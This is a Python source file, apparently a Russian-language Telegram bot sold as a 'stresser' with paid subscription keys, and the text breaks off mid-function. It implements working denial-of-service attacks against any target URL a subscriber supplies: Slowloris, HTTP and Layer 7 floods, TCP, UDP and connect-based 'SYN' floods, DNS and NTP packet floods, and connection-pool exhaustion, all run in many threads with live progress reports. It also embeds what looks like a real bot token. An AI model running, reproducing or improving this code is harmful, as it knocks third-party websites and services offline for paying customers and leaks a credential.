import telebot
import socket
import time
import threading
from threading import Lock, Thread
import random
import os
import logging
from logging.handlers import RotatingFileHandler
from datetime import datetime, timedelta
import struct
import json
import signal
import sys

# Попытаемся импортировать dns, если не доступен - обойдемся без него
try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

from urllib.parse import urlparse

# ==== ЛОГИРОВАНИЕ ====
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Подавляем логирование от библиотек
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("telebot").setLevel(logging.CRITICAL)

# Форматтер с деталями
formatter = logging.Formatter(
    '[%(asctime)s] [%(levelname)-8s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Обработчик для файла (с ротацией)
file_handler = RotatingFileHandler(
    'attack.log',
    maxBytes=10*1024*1024,
    backupCount=5,
    encoding='utf-8'
)
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(formatter)

# Обработчик для консоли
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(formatter)

# Добавляем обработчики
logger.addHandler(file_handler)
logger.addHandler(console_handler)

def log_info(msg):
    logger.info(f"INFO: {msg}")

def log_success(msg):
    logger.info(f"SUCCESS: {msg}")

def log_error(msg):
    logger.error(f"ERROR: {msg}")

def log_warning(msg):
    logger.warning(f"WARNING: {msg}")

def log_debug(msg):
    logger.debug(f"DEBUG: {msg}")

def log_attack(msg):
    logger.info(f"ATTACK: {msg}")

# ==== НАСТРОЙКИ ====
# Список запрещенных сайтов
BLACKLIST = [
    "google.com",
    "vk.com",
    "telegram.org",
    "yandex.ru",
    "progasi.ru"
]

def is_blacklisted(url):
    """Проверяет, входит ли цель в черный список"""
    url_lower = url.lower()
    for domain in BLACKLIST:
        if domain.lower() in url_lower:
            return True
    return False

TOKEN = os.getenv("BOT_TOKEN", "8333226996:AAG47gdt8ZJ-8RqqjzEhKzNM10Ut0E1qH5c")
bot = telebot.TeleBot(TOKEN, skip_pending=True)

# Главные админы (используются для создания ключей и одобрения заявок)
MAIN_ADMINS = {
    5946555648: "admin"  # Замените на ваш Telegram ID
}

# Хранилище данных
users_db = {
    "subscriptions": {},  # {user_id: {"type": "30d"/"perm", "expire": timestamp}}
    "activated_keys": {},  # {key: {"type": "30d"/"perm", "used_by": user_id, "created_at": timestamp}}
    "available_keys": set(),  # Хранит активные ключи
    "admins": MAIN_ADMINS.copy(),  # Администраторы
    "approved": {},  # Одобренные админами пользователи {user_id: username}
    "pending": {},  # Заявки на одобрение {user_id: {username, first_name, status}}
}

db_lock = Lock()
test_running = False
test_results = {
    "total": 0,
    "success": 0,
    "failed": 0,
    "start_time": 0,
    "end_time": 0,
    "method": "",
    "target": "",
    "threads": 0,
}

results_lock = Lock()

# Кэш DNS
dns_cache = {}
dns_cache_lock = Lock()

# ==== БД ====
def save_db():
    try:
        with open("users_db.json", "w") as f:
            data = {
                "subscriptions": users_db["subscriptions"],
                "activated_keys": dict(users_db["activated_keys"]),
                "available_keys": list(users_db["available_keys"]),
                "admins": {str(k): v for k, v in users_db["admins"].items()},
                "approved": {str(k): v for k, v in users_db["approved"].items()},
                "pending": {str(k): v for k, v in users_db["pending"].items()},
            }
            json.dump(data, f, indent=2)
        log_debug("База данных сохранена")
    except Exception as e:
        log_error(f"Ошибка сохранения БД: {str(e)}")

def load_db():
    global users_db
    try:
        if os.path.exists("users_db.json"):
            with open("users_db.json", "r") as f:
                data = json.load(f)
                # Загружаем подписки и ключи (из новой версии)
                users_db["subscriptions"] = {int(k): v for k, v in data.get("subscriptions", {}).items()}
                users_db["activated_keys"] = {str(k): v for k, v in data.get("activated_keys", {}).items()}
                users_db["available_keys"] = set(data.get("available_keys", []))
                # Загружаем админов, одобрения, заявки
                users_db["admins"] = {int(k): v for k, v in data.get("admins", {}).items()}
                users_db["approved"] = {int(k): v for k, v in data.get("approved", {}).items()}
                users_db["pending"] = {int(k): v for k, v in data.get("pending", {}).items()}
                log_success("База данных загружена")
        else:
            log_warning("Файл БД не найден, создаем новый")
    except Exception as e:
        log_error(f"Ошибка загрузки БД: {str(e)}")
    
    # Убедимся, что главные админы всегда есть в списке админов
    for admin_id, admin_name in MAIN_ADMINS.items():
        users_db["admins"][admin_id] = admin_name
    save_db()

# ==== ФУНКЦИИ ДОСТУПА ====
def is_approved(user_id: int) -> bool:
    """Проверяет, одобрен ли пользователь админом"""
    with db_lock:
        return user_id in users_db["approved"] or user_id in users_db["admins"]

def is_admin(user_id: int) -> bool:
    """Проверяет, является ли пользователь админом"""
    with db_lock:
        return user_id in users_db["admins"]

def is_subscribed(user_id: int) -> tuple:
    """Проверяет подписку по ключам: (has_access: bool, type: str, days_left: int)"""
    with db_lock:
        sub = users_db["subscriptions"].get(user_id, {})
        sub_type = sub.get("type", "")
        expire = sub.get("expire", 0)
        
        if sub_type == "perm" or (sub_type == "30d" and expire > time.time()):
            return True, sub_type, get_days_left(expire)
        return False, "", 0

def get_days_left(expire: float) -> int:
    """Сколько дней осталось до истечения подписки"""
    if expire <= time.time():
        return 0
    return int((expire - time.time()) / (24 * 3600))

def has_access(user_id: int) -> bool:
    """Проверяет, есть ли доступ через любую систему (одобрение или подписка)"""
    return is_approved(user_id) or is_subscribed(user_id)[0]

def add_subscription(user_id: int, sub_type: str, expire: float = None):
    """Добавляет/обновляет подписку пользователя"""
    with db_lock:
        if sub_type == "perm":
            users_db["subscriptions"][user_id] = {"type": "perm", "expire": 0}
        else:
            users_db["subscriptions"][user_id] = {"type": "30d", "expire": expire}
        save_db()
        log_success(f"Подписка добавлена для {user_id}: {sub_type}")

def activate_key(user_id: int, key: str) -> bool:
    """Активирует ключ подписки"""
    with db_lock:
        if key not in users_db["available_keys"]:
            return False
        
        key_data = users_db["activated_keys"].get(key, {})
        if key_data.get("used_by"):
            return False
        
        key_type = key_data.get("type", "")
        
        if key_type == "perm":
            users_db["subscriptions"][user_id] = {"type": "perm", "expire": 0}
        elif key_type == "30d":
            expire_time = time.time() + 30 * 24 * 3600
            users_db["subscriptions"][user_id] = {"type": "30d", "expire": expire_time}
        
        # Отмечаем ключ как использованный
        users_db["activated_keys"][key] = {
            "type": key_type,
            "used_by": user_id,
            "created_at": key_data.get("created_at", time.time()),
            "activated_at": time.time()
        }
        users_db["available_keys"].discard(key)
        save_db()
        
        log_success(f"Ключ {key} активирован пользователем {user_id}")
        return True

def generate_key(key_type: str, creator_id: int) -> str:
    """Генерирует уникальный ключ подписки"""
    timestamp = int(time.time())
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
    key = f"{key_type.upper()}-{creator_id}-{timestamp}-{random_part}"
    return key

def create_keys(amount: int, key_type: str, creator_id: int):
    """Создает ключи подписок"""
    keys = []
    with db_lock:
        for _ in range(amount):
            key = generate_key(key_type, creator_id)
            users_db["available_keys"].add(key)
            users_db["activated_keys"][key] = {
                "type": key_type,
                "used_by": None,
                "created_at": time.time()
            }
            keys.append(key)
        save_db()
    return keys

def log_user_action(user_id: int, username: str, action: str):
    log_info(f"[{username or 'NoUsername'}] ID:{user_id} — {action}")

# ==== DNS и парсинг ====
def resolve_dns(host: str) -> str:
    """DNS кэширование и резолв"""
    with dns_cache_lock:
        if host in dns_cache:
            log_debug(f"Используется кэш для {host}")
            return dns_cache[host]
    
    try:
        ip = socket.gethostbyname(host)
        with dns_cache_lock:
            dns_cache[host] = ip
        log_debug(f"DNS резолв: {host} -> {ip}")
        return ip
    except (socket.gaierror, OSError) as e:
        log_error(f"DNS ошибка для {host}: {str(e)}")
        return None

def parse_url(url: str):
    """Парсинг URL с обработкой ошибок"""
    try:
        url = url.replace('https://', '').replace('http://', '')
        
        # Извлекаем host
        if ':' in url:
            host, rest = url.split(':', 1)
            if '/' in rest:
                port_str, path = rest.split('/', 1)
                port = int(port_str)
                path = '/' + path
            else:
                port = int(rest)
                path = '/'
        else:
            if '/' in url:
                host, path = url.split('/', 1)
                path = '/' + path
            else:
                host = url
                path = '/'
            port = 80
        
        # Валидация порта
        if not 1 <= port <= 65535:
            log_error(f"Неверный порт: {port}")
            return None, None, None
        
        log_debug(f"Распарсен URL: host={host}, port={port}, path={path}")
        return host, port, path
    except Exception as e:
        log_error(f"Ошибка парсинга URL '{url}': {str(e)}")
        return None, None, None

# ===== АТАКИ =====

def slowloris_attack(host: str, port: int, thread_id: int = 0) -> bool:
    """Улучшенный Slowloris"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(10)
        
        sock.connect((host, port))
        log_debug(f"[Slowloris #{thread_id}] Соединение установлено")
        
        request = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Connection: keep-alive\r\n"
            f"Keep-Alive: 9001\r\n"
        )
        
        sock.sendall(request.encode())
        
        for i in range(500):
            if not test_running:
                break
            
            header = f"X-Slowloris-Header-{i}: {random.randint(1000, 9999)}\r\n"
            sock.sendall(header.encode())
            time.sleep(random.uniform(0.01, 0.03))
        
        sock.close()
        log_debug(f"[Slowloris #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[Slowloris #{thread_id}] Ошибка: {str(e)}")
        return False

def http_flood_pro(host: str, port: int, path: str, thread_id: int = 0) -> bool:
    """Улучшенный HTTP Flood"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(3)
        
        sock.connect((host, port))
        
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Linux; Android 12)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15)",
            "curl/7.64.1",
            "python-requests/2.28.0"
        ]
        
        for i in range(2000):
            if not test_running:
                break
            
            ua = random.choice(user_agents)
            rand_param = random.randint(10000, 99999)
            
            request = (
                f"GET {path}?q={random.random()}&id={rand_param} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept: */*\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            
            sock.sendall(request.encode())
            time.sleep(0.0005)
        
        sock.close()
        log_debug(f"[HTTP-Flood #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[HTTP-Flood #{thread_id}] Ошибка: {str(e)}")
        return False

def layer7_attack_pro(host: str, port: int, path: str, thread_id: int = 0) -> bool:
    """Усиленный Layer 7 (изменен на GET)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(3)
        
        sock.connect((host, port))
        
        payload_items = []
        for i in range(1000):
            payload_items.append(f"param{i}={''.join([chr(random.randint(65,90)) for _ in range(50)])}")
        
        payload = "&".join(payload_items)

        if '?' in path:
            attack_path = f"{path}&{payload}"
        else:
            attack_path = f"{path}?{payload}"
        
        request = (
            f"GET {attack_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        
        sock.sendall(request.encode())
        sock.close()
        log_debug(f"[Layer7 #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[Layer7 #{thread_id}] Ошибка: {str(e)}")
        return False

def tcp_aggressive_pro(host: str, port: int, path: str, thread_id: int = 0) -> bool:
    """Агрессивный TCP флуд"""
    try:
        for attempt in range(200):
            if not test_running:
                break
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(1)
            
            try:
                sock.connect((host, port))
                
                request = (
                    f"GET {path}?t={random.random()} HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"Connection: close\r\n"
                    f"\r\n"
                )
                
                sock.sendall(request.encode())
            except socket.timeout:
                pass
            finally:
                sock.close()
        
        log_debug(f"[TCP-Aggressive #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[TCP-Aggressive #{thread_id}] Ошибка: {str(e)}")
        return False

def udp_flood_pro(host: str, port: int, thread_id: int = 0) -> bool:
    """UDP флуд"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(0.01)
        
        sizes = [512, 1024, 2048, 4096, 8192]
        
        for _ in range(5000):
            if not test_running:
                break
            
            size = random.choice(sizes)
            payload = os.urandom(size)
            
            try:
                sock.sendto(payload, (host, port))
            except:
                pass
        
        sock.close()
        log_debug(f"[UDP-Flood #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[UDP-Flood #{thread_id}] Ошибка: {str(e)}")
        return False

def syn_flood_simulation(host: str, port: int, thread_id: int = 0) -> bool:
    """SYN флуд симуляция"""
    try:
        for attempt in range(500):
            if not test_running:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.05)
                
                try:
                    sock.connect((host, port))
                except socket.timeout:
                    pass
                
                sock.close()
            except:
                pass
        
        log_debug(f"[SYN-Flood #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[SYN-Flood #{thread_id}] Ошибка: {str(e)}")
        return False

def amplification_dns(host: str, port: int, thread_id: int = 0) -> bool:
    """DNS амплификация"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(2)
        
        for i in range(1000):
            if not test_running:
                break
            
            try:
                dns_id = random.randint(0, 65535)
                header = struct.pack('>HHHHHH', dns_id, 0x0100, 1, 0, 0, 0)
                question = b'\x03www\x07example\x03com\x00\x00\x01\x00\x01'
                
                sock.sendto(header + question, (host, port))
            except:
                pass
        
        sock.close()
        log_debug(f"[DNS-Amplification #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[DNS-Amplification #{thread_id}] Ошибка: {str(e)}")
        return False

def ntp_amplification(host: str, port: int, thread_id: int = 0) -> bool:
    """NTP амплификация"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(2)
        
        ntp_pkt = b'\x17\x00\x03\x2a' + os.urandom(52)
        
        for _ in range(1000):
            if not test_running:
                break
            
            try:
                sock.sendto(ntp_pkt, (host, port))
            except:
                pass
        
        sock.close()
        log_debug(f"[NTP-Amplification #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[NTP-Amplification #{thread_id}] Ошибка: {str(e)}")
        return False

def http_post_stress(host: str, port: int, path: str, thread_id: int = 0) -> bool:
    """HTTP POST стресс (изменен на GET)"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(3)
        
        sock.connect((host, port))
        
        data = "".join([f"{'x'*1000}&" for _ in range(50)])

        if '?' in path:
            attack_path = f"{path}&{data}"
        else:
            attack_path = f"{path}?{data}"
        
        request = (
            f"GET {attack_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            f"Accept: */*\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        
        sock.sendall(request.encode())
        sock.close()
        log_debug(f"[HTTP-Stress #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[HTTP-Stress #{thread_id}] Ошибка: {str(e)}")
        return False

def connection_pool_attack(host: str, port: int, thread_id: int = 0) -> bool:
    """Атака на пул соединений"""
    try:
        connections = []
        
        for i in range(100):
            if not test_running:
                break
            
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(1)
                sock.connect((host, port))
                connections.append(sock)
            except:
                pass
        
        time.sleep(random.uniform(0.5, 2))
        
        for sock in connections:
            try:
                sock.close()
            except:
                pass
        
        log_debug(f"[Connection-Pool #{thread_id}] Успешно")
        return True
    except Exception as e:
        log_debug(f"[Connection-Pool #{thread_id}] Ошибка: {str(e)}")
        return False

def mixed_attack(host: str, port: int, path: str, thread_id: int = 0) -> bool:
    """Смешанная атака"""
    methods_with_path = [
        http_flood_pro,
        layer7_attack_pro,
        tcp_aggressive_pro,
        http_post_stress
    ]
    methods_without_path = [
        slowloris_attack,
        udp_flood_pro,
        connection_pool_attack
    ]
    
    all_methods = methods_with_path + methods_without_path
    method_to_run = random.choice(all_methods)
    
    try:
        if method_to_run in methods_with_path:
            return method_to_run(host, port, path, thread_id)
        else:
            return method_to_run(host, port, thread_id)
            
    except Exception as e:
        log_debug(f"[Mixed #{thread_id}] Ошибка при вызове {method_to_run.__name__}: {str(e)}")
        return False

# ===== РАБОЧИЕ ФУНКЦИИ =====

def worker_attack(host: str, port: int, path: str, method: str, thread_id: int):
    """Рабочий поток для атаки"""
    global test_running, test_results
    
    while test_running:
        try:
            ok = False
            
            if method == "slowloris":
                ok = slowloris_attack(host, port, thread_id)
            elif method == "http":
                ok = http_flood_pro(host, port, path, thread_id)
            elif method == "layer7":
                ok = layer7_attack_pro(host, port, path, thread_id)
            elif method == "tcp2":
                ok = tcp_aggressive_pro(host, port, path, thread_id)
            elif method == "udp":
                ok = udp_flood_pro(host, port, thread_id)
            elif method == "syn":
                ok = syn_flood_simulation(host, port, thread_id)
            elif method == "dns":
                ok = amplification_dns(host, port, thread_id)
            elif method == "ntp":
                ok = ntp_amplification(host, port, thread_id)
            elif method == "post":
                ok = http_post_stress(host, port, path, thread_id)
            elif method == "pool":
                ok = connection_pool_attack(host, port, thread_id)
            elif method == "mixed":
                ok = mixed_attack(host, port, path, thread_id)
            else:
                ok = False
            
            with results_lock:
                test_results["total"] += 1
                if ok:
                    test_results["success"] += 1
                else:
                    test_results["failed"] += 1
        
        except Exception as e:
            log_error(f"Worker #{thread_id} ошибка: {str(e)}")
            with results_lock:
                test_results["total"] += 1
                test_results["failed"] += 1

def load_test_worker(url: str, duration: int, threads: int, method: str, chat_id: int, username: str):
    """Главная функция атаки"""
    global test_running, test_results
    
    host, port, path = parse_url(url)
    
    if not host:
        bot.send_message(chat_id, "❌ *Неверный URL*", parse_mode="Markdown")
        log_error(f"Неверный URL: {url}")
        return
    
    try:
        resolved_ip = resolve_dns(host)
        if not resolved_ip:
            bot.send_message(chat_id, "❌ *Не удалось резолвить хост*", parse_mode="Markdown")
            return
    except Exception as e:
        bot.send_message(chat_id, f"❌ *Ошибка: {str(e)}*", parse_mode="Markdown")
        return
    
    with results_lock:
        test_results = {
            "total": 0, "success": 0, "failed": 0,
            "start_time": time.time(), "end_time": 0,
            "method": method, "target": url, "threads": threads,
        }
    
    log_attack(f"{username}: начал атаку {method} на ресурс {url}")
    
    bot.send_message(chat_id,
        f"🔥 *АТАКА НАЧАТА*\n\n"
        f"⚡ Метод: `{method.upper()}`\n"
        f"🎯 Цель: `{host}:{port}`\n"
        f"👥 Потоков: {threads}\n"
        f"⏱ Время: {duration} сек",
        parse_mode="Markdown")
    
    workers = []
    test_running = True
    
    for i in range(threads):
        t = Thread(
            target=worker_attack,
            args=(resolved_ip, port, path, method, i),
            daemon=True
        )
        t.start()
        workers.append(t)
    
    start = time.time()
    last_msg = 0
    
    try:
        while test_running and time.time() - start < duration:
            elapsed = time.time() - start
            
            with results_lock:
                total = test_results["total"]
                ok = test_results["success"]
                bad = test_results["failed"]
            
            if elapsed - last_msg >= 2 and total > 0:
                rps = total / elapsed
                bot.send_message(chat_id,
                    f"🔥 *АТАКУЕМ*\n\n"
                    f"📦 Всего: `{total}`\n"
                    f"✅ Успешно: `{ok}`\n"
                    f"❌ Ошибок: `{bad}`\n"
                    f"⚡ RPS: `{rps:.0f}/сек`\n"
                    f"⏱ {elapsed:.0f}/{duration} сек",
                    parse_mode="Markdown")
                last_msg = elapsed
            
            time.sleep(0.0005)
    
    finally:
        test_running = False
        
        with results_lock:
            test_results["end_time"] = time.time()
        
        send_final_report(chat_id, username)

def send_final_report(chat_id: int, username: str):
    """Отправить финальный отчет"""
    with results_lock:
        dur = max(0.1, test_results["end_time"] - test_results["start_time"])
        total = test_results["total"]
        ok = test_results["success"]
        bad = test_results["failed"]
        method = test_results["method"]
        target = test_results["target"]
        threads = test_results["threads"]
        rps = total / dur if dur > 0 else 0
        suc_pct = int(ok / max(1, total) * 100)
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("📋 Меню", callback_data="go_menu"))
    
    text = (
        "╔════════════════════════════════╗\n"
        "║ ✅ АТАКА ЗАВЕРШЕНА ✅ ║\n"
        "╚════════════════════════════════╝\n\n"
        "📊 *СТАТИСТИКА:*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Цель: `{target}`\n"
        f"⚡ Метод: `{method.upper()}`\n"
        f"👥 Потоков: {threads}\n"
        f"📦 Всего: {total}\n"
        f"✅ Успешно: {ok} ({suc_pct}%)\n"
        f"❌ Ошибок: {bad}\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Время: {dur:.1f} сек\n"
        f"⚡ Скорость: `{rps:.0f}` req/s"
    )
    
    log_attack(f"Отчет для {username}: {total} запросов, {ok} успешно, {rps:.0f} req/s")
    
    bot.send_message(chat_id, text, reply_markup=kb, parse_mode="Markdown")

# ===== МЕНЮ И ОБРАБОТЧИКИ =====

def send_menu(user_id):
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("⚡ Slowloris", callback_data="method_slowloris"),
        telebot.types.InlineKeyboardButton("🌊 HTTP Flood", callback_data="method_http")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("🔥 Layer 7", callback_data="method_layer7"),
        telebot.types.InlineKeyboardButton("💥 TCP Flood", callback_data="method_tcp2")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("📦 UDP Flood", callback_data="method_udp"),
        telebot.types.InlineKeyboardButton("🔓 SYN Flood", callback_data="method_syn")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("🌐 DNS Amp", callback_data="method_dns"),
        telebot.types.InlineKeyboardButton("🕐 NTP Amp", callback_data="method_ntp")
    )
    kb.add(
        telebot.types.InlineKeyboardButton("📤 POST Stress", callback_data="method_post"),
        telebot.types.InlineKeyboardButton("🔗 Connection Pool", callback_data="method_pool")
    )
    kb.add(telebot.types.InlineKeyboardButton("🎲 Mixed", callback_data="method_mixed"))
    
    # Кнопки для админов
    if is_admin(user_id):
        kb.add(telebot.types.InlineKeyboardButton("👨‍💼 Админ панель", callback_data="admin_panel"))
    
    # Кнопка статуса подписки
    kb.add(telebot.types.InlineKeyboardButton("📊 Мой статус", callback_data="my_status"))
    
    bot.send_message(user_id,
        "╔════════════════════════════════╗\n"
        "║ 📋 ГЛАВНОЕ МЕНЮ ║\n"
        "╚════════════════════════════════╝\n\n"
        "Выбери метод атаки:",
        reply_markup=kb,
        parse_mode="Markdown")

# ===== КОМАНДЫ И ОБРАБОТЧИКИ =====

@bot.message_handler(commands=['start'])
def start_handler(message):
    user_id = message.chat.id
    username = message.from_user.username or "NoUsername"
    log_user_action(user_id, username, "/start")
    
    # Проверяем доступ через обе системы
    has_sub, sub_type, days_left = is_subscribed(user_id)
    has_approved = is_approved(user_id)
    
    kb = telebot.types.InlineKeyboardMarkup()
    
    if has_sub or has_approved:
        kb.add(telebot.types.InlineKeyboardButton("🚀 Меню", callback_data="go_menu"))
        if has_sub:
            if sub_type == "perm":
                status = "🔥 *ПОЖИЗНЕННАЯ ПОДПИСКА*"
            else:
                status = f"⏰ *Подписка 30 дней* ({days_left} дн. осталось)"
        else:
            status = "✅ *Доступ открыт администратором*"
    else:
        kb.add(telebot.types.InlineKeyboardButton("🔑 Активировать ключ", callback_data="activate_key"))
        kb.add(telebot.types.InlineKeyboardButton("📝 Подать заявку", callback_data="apply_access"))
        kb.add(telebot.types.InlineKeyboardButton("ℹ️ Как получить доступ", callback_data="how_to_get"))
        status = "❌ *НЕТ ДОСТУПА*\n\nДля использования бота нужна активная подписка или одобрение администратора!"
    
    # Кнопка создания ключей для админов
    if is_admin(user_id):
        kb.add(telebot.types.InlineKeyboardButton("🔑 Создать ключи", callback_data="create_keys"))
    
    text = (
        "╔════════════════════════════════╗\n"
        "║ 🔥 COMBINED STRESSER BOT 🔥 ║\n"
        "╚════════════════════════════════╝\n\n"
        f"{status}\n\n"
        "Используй кнопки ниже."
    )
    
    bot.send_message(user_id, text, reply_markup=kb, parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_handler(message):
    user_id = message.chat.id
    username = message.from_user.username or "NoUsername"
    log_user_action(user_id, username, "/status")
    
    has_sub, sub_type, days_left = is_subscribed(user_id)
    has_approved = is_approved(user_id)
    
    if has_sub:
        if sub_type == "perm":
            text = f"✅ *Активная подписка:* Пожизненная\n🔥 *Статус:* Полный доступ"
        else:
            text = f"✅ *Активная подписка:* 30 дней\n📅 *Осталось:* {days_left} дней\n🔥 *Статус:* Полный доступ"
    elif has_approved:
        text = "✅ *Доступ открыт администратором*\n🔥 *Статус:* Полный доступ"
    else:
        text = "❌ *Нет активной подписки*\n\nДля использования бота нужна подписка или одобрение администратора!\n\nИспользуй /start для активации."
    
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['menu'])
def menu_handler(message):
    user_id = message.chat.id
    if not has_access(user_id):
        bot.reply_to(message, 
            "❌ *Нет доступа!*\n\n"
            "Для использования меню нужна активная подписка или одобрение администратора.\n"
            "Используй /start для получения доступа.",
            parse_mode="Markdown")
        return
    
    username = message.from_user.username or "NoUsername"
    log_user_action(user_id, username, "/menu")
    send_menu(user_id)

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = message.chat.id
    if not has_access(user_id):
        bot.reply_to(message, "❌ *Нет доступа!*\nИспользуй /start", parse_mode="Markdown")
        return
    
    global test_running
    
    username = message.from_user.username or "NoUsername"
    log_user_action(user_id, username, "/stop")
    
    test_running = False
    bot.reply_to(message, "🛑 *Атака остановлена!*\n\nВы можете запустить новую атаку.", parse_mode="Markdown")

# ===== СИСТЕМА ПОДПИСК (КЛЮЧИ) =====

@bot.callback_query_handler(func=lambda call: call.data == "activate_key")
def activate_key_menu(call):
    user_id = call.message.chat.id
    has_sub, _, _ = is_subscribed(user_id)
    
    if has_sub:
        bot.answer_callback_query(call.id, "✅ У вас уже активная подписка!", show_alert=True)
        return
    
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("🔙 Главное меню", callback_data="back_start"))
    
    bot.edit_message_text(
        "🔑 *АКТИВАЦИЯ КЛЮЧА ПОДПИСКИ*\n\n"
        "Отправь мне ключ активации:\n"
        "`/activate <твой_ключ>`\n\n"
        "Пример:\n`/activate PERM-5946555648-1234567890-ABCDEF12`",
        call.message.chat.id,
        call.message.message_id,
        reply_markup=kb,
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['activate'])
def activate_key_handler(message):
    user_id = message.chat.id
    has_sub, _, _ = is_subscribed(user_id)
    
    if has_sub:
        bot.reply_to(message, "✅ *У вас уже активная подписка!*\nИспользуйте /status для проверки.", parse_mode="Markdown")
        return
    
    parts = message.text.split()
    
    if len(parts) < 2:
        kb = telebot.types.InlineKeyboardMarkup()
        kb.add(telebot.types.InlineKeyboardButton("🔙 Назад", callback_data="back_start"))
        bot.reply_to(message,
            "❌ *Неверный формат!*\n\n"
            "Правильный формат:\n`/activate <твой_ключ>`\n\n"
            "Пример:\n`/activate PERM-5946555648-1234567890-ABCDEF12`",
            reply_markup=kb,
            parse_mode="Markdown")
        return
    
    key = parts[1].strip()
    username = message.from_user.username or "NoUsername"
    
    if activate_key(user_id, key):
        if key.startswith("PERM"):
            status_text = "🔥 *ПОЖИЗНЕННАЯ ПОДПИСКА АКТИВИРОВАНА!*"
        else:
            status_text = "⏰ *ПОДПИСКА НА 30 ДНЕЙ АКТИВИРОВАНА!*"
        
        kb = telebot.types.InlineKeyboardMarkup()
        kb.add(telebot.types.InlineKeyboardButton("🚀 Меню атак", callback_data="go_menu"))
        
        bot.reply_to(message,
            f"{status_text}\n\n"
            f"✅ Теперь у вас есть полный доступ ко всем функциям бота!\n\n"
            f"Доступно:\n• Все методы атак\n• Неограниченное количество запросов\n• Полная статистика",
            reply_markup=kb,
            parse_mode="Markdown")
        
        log_success(f"Ключ {key} успешно активирован пользователем {user_id}")
    else:
        kb = telebot.types.InlineKeyboardMarkup()
        kb.add(telebot.types.InlineKeyboardButton("🔙 Попробовать еще раз", callback_data="activate_key"))
        
